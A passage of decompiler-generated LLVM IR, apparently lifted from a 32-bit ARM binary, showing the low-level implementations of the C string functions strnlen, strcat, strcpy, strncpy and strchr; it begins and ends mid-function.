  uselistorder i8 %v3_15300, { 1, 0 }
  uselistorder i32 %v1_15300, { 0, 2, 3, 1 }
  uselistorder i32 %v1_152a4, { 0, 2, 3, 1 }
  uselistorder i8 %v3_15294, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15384, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15380, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15334, { 1, 0 }
  uselistorder label %dec_label_pc_15314, { 1, 0 }
  uselistorder label %dec_label_pc_1530c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152e4, { 1, 0 }
  uselistorder label %dec_label_pc_15304.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1538c = icmp eq i32 %arg2, 0
  br i1 %v2_1538c, label %bb, label %dec_label_pc_153a0

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_153a0:                               ; preds = %entry
  %v2_153a0 = add i32 %tmp, %arg2
  %v3_153a0 = icmp ult i32 %v2_153a0, %tmp
  br i1 %v3_153a0, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_153a0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_153a0, %bb19
  %v5_15440 = phi i32 [ %v2_153a0, %dec_label_pc_153a0 ], [ -1, %bb19 ]
  %v1_153c04 = urem i32 %tmp, 4
  %v2_153c05 = icmp eq i32 %v1_153c04, 0
  br i1 %v2_153c05, label %dec_label_pc_153c8, label %dec_label_pc_153b0

dec_label_pc_153b0:                               ; preds = %bb20, %dec_label_pc_153bc
  %v0_153bc = phi i32 [ %v1_153bc, %dec_label_pc_153bc ], [ %tmp, %bb20 ]
  %v1_153b0 = inttoptr i32 %v0_153bc to i8*
  %v2_153b0 = load i8, i8* %v1_153b0, align 1
  %v2_153b4 = icmp eq i8 %v2_153b0, 0
  br i1 %v2_153b4, label %dec_label_pc_1543c, label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %dec_label_pc_153b0
  %v1_153bc = add i32 %v0_153bc, 1
  %v1_153c0 = urem i32 %v1_153bc, 4
  %v2_153c0 = icmp eq i32 %v1_153c0, 0
  br i1 %v2_153c0, label %dec_label_pc_153c8, label %dec_label_pc_153b0

dec_label_pc_153c8:                               ; preds = %dec_label_pc_153bc, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_153bc, %dec_label_pc_153bc ]
  %v3_1542c30 = icmp ult i32 %storemerge.lcssa, %v5_15440
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_1542c30, label %dec_label_pc_153d0, label %dec_label_pc_1543c

dec_label_pc_153d0:                               ; preds = %dec_label_pc_15428, %dec_label_pc_153c8
  %v0_1542037 = phi i32 [ %v4_153d0, %dec_label_pc_15428 ], [ %storemerge.lcssa, %dec_label_pc_153c8 ]
  %v1_153d0 = inttoptr i32 %v0_1542037 to i32*
  %v2_153d0 = load i32, i32* %v1_153d0, align 4
  %v4_153d0 = add i32 %v0_1542037, 4
  %v2_153d4 = add i32 %v2_153d0, -16843009
  %v2_153d8 = and i32 %v2_153d4, -2139062144
  store i32 %v2_153d8, i32* @ip, align 4
  %v2_153dc = icmp eq i32 %v2_153d8, 0
  br i1 %v2_153dc, label %dec_label_pc_15428, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153d0
  %v2_153e4 = inttoptr i32 %v0_1542037 to i8*
  %v3_153e4 = load i8, i8* %v2_153e4, align 1
  %v2_153e8 = icmp eq i8 %v3_153e4, 0
  br i1 %v2_153e8, label %bb21, label %dec_label_pc_153f8

bb21:                                             ; preds = %dec_label_pc_153e4
  br label %dec_label_pc_1543c

dec_label_pc_153f8:                               ; preds = %dec_label_pc_153e4
  %v1_153f8 = add i32 %v0_1542037, 1
  %v2_153f8 = inttoptr i32 %v1_153f8 to i8*
  %v3_153f8 = load i8, i8* %v2_153f8, align 1
  %v2_153fc = icmp eq i8 %v3_153f8, 0
  br i1 %v2_153fc, label %dec_label_pc_1543c, label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_153f8
  %v1_15408 = add i32 %v0_1542037, 2
  %v2_15408 = inttoptr i32 %v1_15408 to i8*
  %v3_15408 = load i8, i8* %v2_15408, align 1
  %v2_1540c = icmp eq i8 %v3_15408, 0
  br i1 %v2_1540c, label %dec_label_pc_1543c, label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %dec_label_pc_15408
  %v1_15418 = add i32 %v0_1542037, 3
  %v2_15418 = inttoptr i32 %v1_15418 to i8*
  %v3_15418 = load i8, i8* %v2_15418, align 1
  %v2_1541c = icmp eq i8 %v3_15418, 0
  br i1 %v2_1541c, label %dec_label_pc_1543c, label %dec_label_pc_15428

dec_label_pc_15428:                               ; preds = %dec_label_pc_15418, %dec_label_pc_153d0
  %v3_1542c = icmp ult i32 %v4_153d0, %v5_15440
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_1542c, label %dec_label_pc_153d0, label %dec_label_pc_1543c

dec_label_pc_1543c:                               ; preds = %dec_label_pc_15428, %dec_label_pc_153c8, %dec_label_pc_153b0, %dec_label_pc_153f8, %dec_label_pc_15408, %dec_label_pc_15418, %bb21
  %v1_1543c = phi i32 [ %v0_1542037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_153c8 ], [ %v1_153f8, %dec_label_pc_153f8 ], [ %v1_15408, %dec_label_pc_15408 ], [ %v1_15418, %dec_label_pc_15418 ], [ %v5_15440, %dec_label_pc_15428 ], [ %v0_153bc, %dec_label_pc_153b0 ]
  %v3_1543c = icmp uge i32 %v5_15440, %v1_1543c
  %v9_1543c = icmp eq i32 %v5_15440, %v1_1543c
  %v2_15440 = xor i1 %v3_1543c, true
  %v3_15440 = or i1 %v9_1543c, %v2_15440
  br i1 %v3_15440, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1543c
  %v6_15440 = sub i32 %v5_15440, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1543c, %bb22
  %v5_15444 = phi i32 [ %v1_1543c, %dec_label_pc_1543c ], [ %v6_15440, %bb22 ]
  %v2_15444 = xor i1 %v9_1543c, true
  %v3_15444 = and i1 %v3_1543c, %v2_15444
  br i1 %v3_15444, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_15444 = sub i32 %v5_15444, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_1544c = phi i32 [ 0, %bb ], [ %v5_15444, %bb23 ], [ %v6_15444, %bb24 ]
  ret i32 %v1_1544c

; uselistorder directives
  uselistorder i1 %v3_1543c, { 1, 0 }
  uselistorder i32 %v4_153d0, { 1, 0 }
  uselistorder i32 %v0_1542037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_153bc, { 1, 0, 2 }
  uselistorder i32 %v5_15440, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_1543c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_153b0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1545c

dec_label_pc_1545c:                               ; preds = %dec_label_pc_1545c, %entry
  %v0_1545c = phi i32 [ %v5_1545c, %dec_label_pc_1545c ], [ %tmp, %entry ]
  %v1_1545c = inttoptr i32 %v0_1545c to i8*
  %v2_1545c = load i8, i8* %v1_1545c, align 1
  %v5_1545c = add i32 %v0_1545c, 1
  store i32 %v5_1545c, i32* %r2.global-to-local, align 4
  %v2_15460 = icmp eq i8 %v2_1545c, 0
  store i1 %v2_15460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15460, label %dec_label_pc_15468, label %dec_label_pc_1545c

dec_label_pc_15468:                               ; preds = %dec_label_pc_1545c
  %v1_15468 = add i32 %v0_1545c, -1
  store i32 %v1_15468, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1546c

dec_label_pc_1546c:                               ; preds = %dec_label_pc_1546c, %dec_label_pc_15468
  %v2_15474 = phi i32 [ %v6_15474, %dec_label_pc_1546c ], [ %v1_15468, %dec_label_pc_15468 ]
  %v0_1546c = load i32, i32* @r1, align 4
  %v1_1546c = inttoptr i32 %v0_1546c to i8*
  %v2_1546c = load i8, i8* %v1_1546c, align 1
  %v5_1546c = add i32 %v0_1546c, 1
  store i32 %v5_1546c, i32* @r1, align 4
  %v2_15470 = icmp eq i8 %v2_1546c, 0
  store i1 %v2_15470, i1* %cpsr_z.global-to-local, align 1
  %v3_15474 = add i32 %v2_15474, 1
  %v4_15474 = inttoptr i32 %v3_15474 to i8*
  store i8 %v2_1546c, i8* %v4_15474, align 1
  %v5_15474 = load i32, i32* %r2.global-to-local, align 4
  %v6_15474 = add i32 %v5_15474, 1
  store i32 %v6_15474, i32* %r2.global-to-local, align 4
  %v0_15478 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15478, label %dec_label_pc_1547c, label %dec_label_pc_1546c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_1546c
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15474, { 1, 0 }
  uselistorder i32 %v5_1545c, { 1, 0 }
  uselistorder i32 %v0_1545c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_154901 = load i32, i32* @r1, align 4
  %v1_154902 = inttoptr i32 %v0_154901 to i8*
  %v2_154903 = load i8, i8* %v1_154902, align 1
  %v2_154945 = icmp eq i8 %v2_154903, 0
  store i1 %v2_154945, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_154903, i8* %arg1, align 1
  br i1 %v2_154945, label %dec_label_pc_154a0, label %dec_label_pc_15488

dec_label_pc_15488:                               ; preds = %entry, %dec_label_pc_15488
  %v0_15488 = load i32, i32* @r1, align 4
  %v1_15488 = add i32 %v0_15488, 1
  store i32 %v1_15488, i32* @r1, align 4
  %v0_1548c = load i32, i32* %r2.global-to-local, align 4
  %v1_1548c = add i32 %v0_1548c, 1
  store i32 %v1_1548c, i32* %r2.global-to-local, align 4
  %v1_15490 = inttoptr i32 %v1_15488 to i8*
  %v2_15490 = load i8, i8* %v1_15490, align 1
  %v2_15494 = icmp eq i8 %v2_15490, 0
  store i1 %v2_15494, i1* %cpsr_z.global-to-local, align 1
  %v3_15498 = inttoptr i32 %v1_1548c to i8*
  store i8 %v2_15490, i8* %v3_15498, align 1
  %v0_1549c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1549c, label %dec_label_pc_154a0, label %dec_label_pc_15488

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15488, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15488, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_154a4 = icmp eq i32 %arg2, 3
  store i1 %v7_154a4, i1* %cpsr_z.global-to-local, align 1
  %v0_154a8 = load i32, i32* @lr, align 4
  store i32 %v0_154a8, i32* %stack_var_-4, align 4
  %v1_154ac = add i32 %arg1, -1
  store i32 %v1_154ac, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_15528, label %dec_label_pc_154b4

dec_label_pc_154b4:                               ; preds = %entry
  %v3_154b4 = udiv i32 %arg2, 4
  store i32 %v3_154b4, i32* %lr.global-to-local, align 4
  %v0_154b8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_154b8

dec_label_pc_154b8:                               ; preds = %dec_label_pc_15504, %dec_label_pc_154b4
  %v2_154c0 = phi i32 [ %v6_154f8, %dec_label_pc_15504 ], [ %v1_154ac, %dec_label_pc_154b4 ]
  %v0_154b8 = phi i32 [ %v1_15508, %dec_label_pc_15504 ], [ %v0_154b8.pre, %dec_label_pc_154b4 ]
  %v1_154b8 = inttoptr i32 %v0_154b8 to i8*
  %v2_154b8 = load i8, i8* %v1_154b8, align 1
  %v3_154b8 = zext i8 %v2_154b8 to i32
  store i32 %v3_154b8, i32* %r3.global-to-local, align 4
  %v2_154bc = icmp eq i8 %v2_154b8, 0
  store i1 %v2_154bc, i1* %cpsr_z.global-to-local, align 1
  %v3_154c0 = add i32 %v2_154c0, 1
  %v4_154c0 = inttoptr i32 %v3_154c0 to i8*
  store i8 %v2_154b8, i8* %v4_154c0, align 1
  %v5_154c0 = load i32, i32* @ip, align 4
  %v6_154c0 = add i32 %v5_154c0, 1
  store i32 %v6_154c0, i32* @ip, align 4
  %v0_154c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154c4, label %dec_label_pc_15514, label %dec_label_pc_154c8

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154b8
  %v0_154c8 = load i32, i32* @r1, align 4
  %v1_154c8 = add i32 %v0_154c8, 1
  %v2_154c8 = inttoptr i32 %v1_154c8 to i8*
  %v3_154c8 = load i8, i8* %v2_154c8, align 1
  %v4_154c8 = zext i8 %v3_154c8 to i32
  store i32 %v4_154c8, i32* %r3.global-to-local, align 4
  %v2_154cc = icmp eq i8 %v3_154c8, 0
  store i1 %v2_154cc, i1* %cpsr_z.global-to-local, align 1
  %v3_154d0 = add i32 %v5_154c0, 2
  %v4_154d0 = inttoptr i32 %v3_154d0 to i8*
  store i8 %v3_154c8, i8* %v4_154d0, align 1
  %v5_154d0 = load i32, i32* @ip, align 4
  %v6_154d0 = add i32 %v5_154d0, 1
  store i32 %v6_154d0, i32* @ip, align 4
  %v0_154d4 = load i32, i32* @r1, align 4
  %v1_154d4 = add i32 %v0_154d4, 1
  store i32 %v1_154d4, i32* %r1.global-to-local, align 4
  %v0_154d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154d8, label %dec_label_pc_15514, label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154c8
  %v1_154dc = add i32 %v0_154d4, 2
  %v2_154dc = inttoptr i32 %v1_154dc to i8*
  %v3_154dc = load i8, i8* %v2_154dc, align 1
  %v4_154dc = zext i8 %v3_154dc to i32
  store i32 %v4_154dc, i32* %r3.global-to-local, align 4
  %v2_154e0 = icmp eq i8 %v3_154dc, 0
  store i1 %v2_154e0, i1* %cpsr_z.global-to-local, align 1
  %v3_154e4 = add i32 %v5_154d0, 2
  %v4_154e4 = inttoptr i32 %v3_154e4 to i8*
  store i8 %v3_154dc, i8* %v4_154e4, align 1
  %v5_154e4 = load i32, i32* @ip, align 4
  %v6_154e4 = add i32 %v5_154e4, 1
  store i32 %v6_154e4, i32* @ip, align 4
  %v0_154e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_154e8 = add i32 %v0_154e8, 1
  store i32 %v1_154e8, i32* %r1.global-to-local, align 4
  %v0_154ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154ec, label %dec_label_pc_15514, label %dec_label_pc_154f0

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154dc
  %v1_154f0 = add i32 %v0_154e8, 2
  %v2_154f0 = inttoptr i32 %v1_154f0 to i8*
  %v3_154f0 = load i8, i8* %v2_154f0, align 1
  %v4_154f0 = zext i8 %v3_154f0 to i32
  store i32 %v4_154f0, i32* %r3.global-to-local, align 4
  %v2_154f4 = icmp eq i8 %v3_154f0, 0
  store i1 %v2_154f4, i1* %cpsr_z.global-to-local, align 1
  %v3_154f8 = add i32 %v5_154e4, 2
  %v4_154f8 = inttoptr i32 %v3_154f8 to i8*
  store i8 %v3_154f0, i8* %v4_154f8, align 1
  %v5_154f8 = load i32, i32* @ip, align 4
  %v6_154f8 = add i32 %v5_154f8, 1
  store i32 %v6_154f8, i32* @ip, align 4
  %v0_154fc = load i32, i32* %r1.global-to-local, align 4
  %v1_154fc = add i32 %v0_154fc, 1
  store i32 %v1_154fc, i32* %r1.global-to-local, align 4
  %v0_15500 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15500, label %dec_label_pc_15514, label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %dec_label_pc_154f0
  %v0_15504 = load i32, i32* %lr.global-to-local, align 4
  %v1_15504 = add i32 %v0_15504, -1
  store i32 %v1_15504, i32* %lr.global-to-local, align 4
  %v7_15504 = icmp eq i32 %v0_15504, 1
  store i1 %v7_15504, i1* %cpsr_z.global-to-local, align 1
  %v1_15508 = add i32 %v0_154fc, 2
  store i32 %v1_15508, i32* @r1, align 4
  br i1 %v7_15504, label %dec_label_pc_15528, label %dec_label_pc_154b8

dec_label_pc_15514:                               ; preds = %dec_label_pc_154f0, %dec_label_pc_154dc, %dec_label_pc_154c8, %dec_label_pc_154b8
  %v1_15514 = phi i32 [ %v6_154f8, %dec_label_pc_154f0 ], [ %v6_154e4, %dec_label_pc_154dc ], [ %v6_154d0, %dec_label_pc_154c8 ], [ %v6_154c0, %dec_label_pc_154b8 ]
  %v2_155141 = sub i32 %arg1, %v1_15514
  %v2_15518 = add i32 %v2_155141, %arg2
  %v1_1551c = add i32 %v2_15518, -1
  store i32 %v1_1551c, i32* %r3.global-to-local, align 4
  %v7_1551c = icmp eq i32 %v2_15518, 1
  store i1 %v7_1551c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1551c, label %dec_label_pc_15558, label %dec_label_pc_15548

dec_label_pc_15528:                               ; preds = %dec_label_pc_15504, %entry
  %v2_155387 = phi i32 [ %v1_154ac, %entry ], [ %v6_154f8, %dec_label_pc_15504 ]
  %v1_15528 = urem i32 %arg2, 4
  store i32 %v1_15528, i32* %r3.global-to-local, align 4
  %v2_15528 = icmp eq i32 %v1_15528, 0
  store i1 %v2_15528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15528, label %dec_label_pc_15558, label %dec_label_pc_15530

dec_label_pc_15530:                               ; preds = %dec_label_pc_15528, %dec_label_pc_15540.dec_label_pc_15530_crit_edge
  %v2_15538 = phi i32 [ %v6_15538, %dec_label_pc_15540.dec_label_pc_15530_crit_edge ], [ %v2_155387, %dec_label_pc_15528 ]
  %v0_15534 = phi i32 [ %v0_15534.pre, %dec_label_pc_15540.dec_label_pc_15530_crit_edge ], [ %v1_15528, %dec_label_pc_15528 ]
  %v0_15530 = load i32, i32* @r1, align 4
  %v1_15530 = inttoptr i32 %v0_15530 to i8*
  %v2_15530 = load i8, i8* %v1_15530, align 1
  %v3_15530 = zext i8 %v2_15530 to i32
  store i32 %v3_15530, i32* %r2.global-to-local, align 4
  %v5_15530 = add i32 %v0_15530, 1
  store i32 %v5_15530, i32* @r1, align 4
  %v1_15534 = add i32 %v0_15534, -1
  store i32 %v1_15534, i32* %r3.global-to-local, align 4
  %v7_15534 = icmp eq i32 %v0_15534, 1
  store i1 %v7_15534, i1* %cpsr_z.global-to-local, align 1
  %v3_15538 = add i32 %v2_15538, 1
  %v4_15538 = inttoptr i32 %v3_15538 to i8*
  store i8 %v2_15530, i8* %v4_15538, align 1
  %v5_15538 = load i32, i32* @ip, align 4
  %v6_15538 = add i32 %v5_15538, 1
  store i32 %v6_15538, i32* @ip, align 4
  %v0_1553c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1553c, label %dec_label_pc_15558, label %dec_label_pc_15540

dec_label_pc_15540:                               ; preds = %dec_label_pc_15530
  %v0_15540 = load i32, i32* %r2.global-to-local, align 4
  %v2_15540 = icmp eq i32 %v0_15540, 0
  store i1 %v2_15540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15540, label %dec_label_pc_15548, label %dec_label_pc_15540.dec_label_pc_15530_crit_edge

dec_label_pc_15540.dec_label_pc_15530_crit_edge:  ; preds = %dec_label_pc_15540
  %v0_15534.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15530

dec_label_pc_15548:                               ; preds = %dec_label_pc_15540, %dec_label_pc_15514
  %v2_1555010 = phi i32 [ %v1_15514, %dec_label_pc_15514 ], [ %v6_15538, %dec_label_pc_15540 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1554c

dec_label_pc_1554c:                               ; preds = %dec_label_pc_1554c.dec_label_pc_1554c_crit_edge, %dec_label_pc_15548
  %v2_15550 = phi i32 [ %v6_15550, %dec_label_pc_1554c.dec_label_pc_1554c_crit_edge ], [ %v2_1555010, %dec_label_pc_15548 ]
  %v0_15550.off0 = phi i8 [ %extract.t, %dec_label_pc_1554c.dec_label_pc_1554c_crit_edge ], [ 0, %dec_label_pc_15548 ]
  %v0_1554c = load i32, i32* %r3.global-to-local, align 4
  %v1_1554c = add i32 %v0_1554c, -1
  store i32 %v1_1554c, i32* %r3.global-to-local, align 4
  %v7_1554c = icmp eq i32 %v0_1554c, 1
  store i1 %v7_1554c, i1* %cpsr_z.global-to-local, align 1
  %v3_15550 = add i32 %v2_15550, 1
  %v4_15550 = inttoptr i32 %v3_15550 to i8*
  store i8 %v0_15550.off0, i8* %v4_15550, align 1
  %v5_15550 = load i32, i32* @ip, align 4
  %v6_15550 = add i32 %v5_15550, 1
  store i32 %v6_15550, i32* @ip, align 4
  %v0_15554 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15554, label %dec_label_pc_15558, label %dec_label_pc_1554c.dec_label_pc_1554c_crit_edge

dec_label_pc_1554c.dec_label_pc_1554c_crit_edge:  ; preds = %dec_label_pc_1554c
  %v0_15550.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_15550.pre to i8
  br label %dec_label_pc_1554c

dec_label_pc_15558:                               ; preds = %dec_label_pc_15530, %dec_label_pc_1554c, %dec_label_pc_15514, %dec_label_pc_15528
  %v2_15558 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15558, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15550, { 1, 0 }
  uselistorder i32 %v0_1554c, { 1, 0 }
  uselistorder i32 %v6_15538, { 0, 2, 1 }
  uselistorder i32 %v1_15528, { 2, 1, 0 }
  uselistorder i32 %v2_15518, { 1, 0 }
  uselistorder i32 %v1_15508, { 1, 0 }
  uselistorder i32 %v0_15504, { 1, 0 }
  uselistorder i32 %v6_154f8, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15558, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_15530, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15564 = urem i32 %arg1, 256
  %v0_155843 = load i32, i32* @r0, align 4
  %v1_155844 = urem i32 %v0_155843, 4
  %v2_155845 = icmp eq i32 %v1_155844, 0
  br i1 %v2_155845, label %dec_label_pc_1558c, label %dec_label_pc_1556c

dec_label_pc_1556c:                               ; preds = %entry, %dec_label_pc_15580
  %v0_15580 = phi i32 [ %v1_15580, %dec_label_pc_15580 ], [ %v0_155843, %entry ]
  %v1_1556c = inttoptr i32 %v0_15580 to i8*
  %v2_1556c = load i8, i8* %v1_1556c, align 1
  %v3_1556c = zext i8 %v2_1556c to i32
  store i32 %v3_1556c, i32* @r3, align 4
  %v9_15570 = icmp eq i32 %v3_1556c, %v1_15564
  br i1 %v9_15570, label %dec_label_pc_15640, label %dec_label_pc_15578

dec_label_pc_15578:                               ; preds = %dec_label_pc_1556c
  %v2_15578 = icmp eq i8 %v2_1556c, 0
  br i1 %v2_15578, label %dec_label_pc_1563c, label %dec_label_pc_15580

dec_label_pc_15580:                               ; preds = %dec_label_pc_15578
  %v1_15580 = add i32 %v0_15580, 1
  %v1_15584 = urem i32 %v1_15580, 4
  %v2_15584 = icmp eq i32 %v1_15584, 0
  br i1 %v2_15584, label %dec_label_pc_1558c, label %dec_label_pc_1556c

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15580, %entry
  %v0_15590 = phi i32 [ %v0_155843, %entry ], [ %v1_15580, %dec_label_pc_15580 ]
  %v4_1558c = mul nuw nsw i32 %v1_15564, 256
  %v5_1558c = or i32 %v4_1558c, %v1_15564
  %v4_15594 = mul i32 %v5_1558c, 65536
  %v5_15594 = or i32 %v4_15594, %v5_1558c
  br label %dec_label_pc_15598

dec_label_pc_15598:                               ; preds = %dec_label_pc_15634, %dec_label_pc_155d4, %dec_label_pc_1558c
  %v0_155fc = phi i32 [ %v0_15590, %dec_label_pc_1558c ], [ %v4_15598, %dec_label_pc_155d4 ], [ %v4_15598, %dec_label_pc_15634 ]
  %v1_15598 = inttoptr i32 %v0_155fc to i32*
  %v2_15598 = load i32, i32* %v1_15598, align 4
  %v4_15598 = add i32 %v0_155fc, 4
  %v2_155a0 = xor i32 %v2_15598, %v5_15594
  %v2_155a4 = add i32 %v2_155a0, 2130640639
  store i32 %v2_155a4, i32* @ip, align 4
  %v2_155ac = add i32 %v2_15598, 2130640639
  %v1_155b0 = sub i32 -1, %v2_15598
  %v2_155b4 = xor i32 %v2_155ac, %v1_155b0
  %v2_155c0 = and i32 %v2_155b4, -2130640640
  %v2_155c8 = icmp eq i32 %v2_155c0, 0
  br i1 %v2_155c8, label %dec_label_pc_155d4, label %dec_label_pc_155dc

dec_label_pc_155d4:                               ; preds = %dec_label_pc_15598
  %v1_155bc = sub i32 -1, %v2_155a0
  %v2_155c4 = xor i32 %v2_155a4, %v1_155bc
  %v2_155cc = and i32 %v2_155c4, -2130640640
  %v2_155d4 = icmp eq i32 %v2_155cc, 0
  br i1 %v2_155d4, label %dec_label_pc_15598, label %dec_label_pc_155dc

dec_label_pc_155dc:                               ; preds = %dec_label_pc_15598, %dec_label_pc_155d4
  %v2_155dc = inttoptr i32 %v0_155fc to i8*
  %v3_155dc = load i8, i8* %v2_155dc, align 1
  %v4_155dc = zext i8 %v3_155dc to i32
  store i32 %v4_155dc, i32* @r3, align 4
  %v9_155e0 = icmp eq i32 %v4_155dc, %v1_15564
  br i1 %v9_155e0, label %dec_label_pc_15640, label %dec_label_pc_155ec

dec_label_pc_155ec:                               ; preds = %dec_label_pc_155dc
  %v2_155ec = icmp eq i8 %v3_155dc, 0
  br i1 %v2_155ec, label %dec_label_pc_1563c, label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %dec_label_pc_155ec
  %v1_155f4 = add i32 %v0_155fc, 1
  %v2_155f4 = inttoptr i32 %v1_155f4 to i8*
  %v3_155f4 = load i8, i8* %v2_155f4, align 1
  %v4_155f4 = zext i8 %v3_155f4 to i32
  store i32 %v4_155f4, i32* @r3, align 4
  %v9_155f8 = icmp eq i32 %v4_155f4, %v1_15564
  br i1 %v9_155f8, label %dec_label_pc_15640, label %dec_label_pc_15604

dec_label_pc_15604:                               ; preds = %dec_label_pc_155f4
  %v2_15604 = icmp eq i8 %v3_155f4, 0
  br i1 %v2_15604, label %dec_label_pc_1563c, label %dec_label_pc_1560c

dec_label_pc_1560c:                               ; preds = %dec_label_pc_15604
  %v1_1560c = add i32 %v0_155fc, 2
  %v2_1560c = inttoptr i32 %v1_1560c to i8*
  %v3_1560c = load i8, i8* %v2_1560c, align 1
  %v4_1560c = zext i8 %v3_1560c to i32
  store i32 %v4_1560c, i32* @r3, align 4
  %v9_15610 = icmp eq i32 %v4_1560c, %v1_15564
  br i1 %v9_15610, label %dec_label_pc_15640, label %dec_label_pc_1561c

dec_label_pc_1561c:                               ; preds = %dec_label_pc_1560c
  %v2_1561c = icmp eq i8 %v3_1560c, 0
  br i1 %v2_1561c, label %dec_label_pc_1563c, label %dec_label_pc_15624

dec_label_pc_15624:                               ; preds = %dec_label_pc_1561c
  %v1_15624 = add i32 %v0_155fc, 3
  %v2_15624 = inttoptr i32 %v1_15624 to i8*
  %v3_15624 = load i8, i8* %v2_15624, align 1
  %v4_15624 = zext i8 %v3_15624 to i32
  store i32 %v4_15624, i32* @r3, align 4
  %v9_15628 = icmp eq i32 %v4_15624, %v1_15564
  br i1 %v9_15628, label %dec_label_pc_15640, label %dec_label_pc_15634

dec_label_pc_15634:                               ; preds = %dec_label_pc_15624
  %v2_15634 = icmp eq i8 %v3_15624, 0
  br i1 %v2_15634, label %dec_label_pc_1563c, label %dec_label_pc_15598

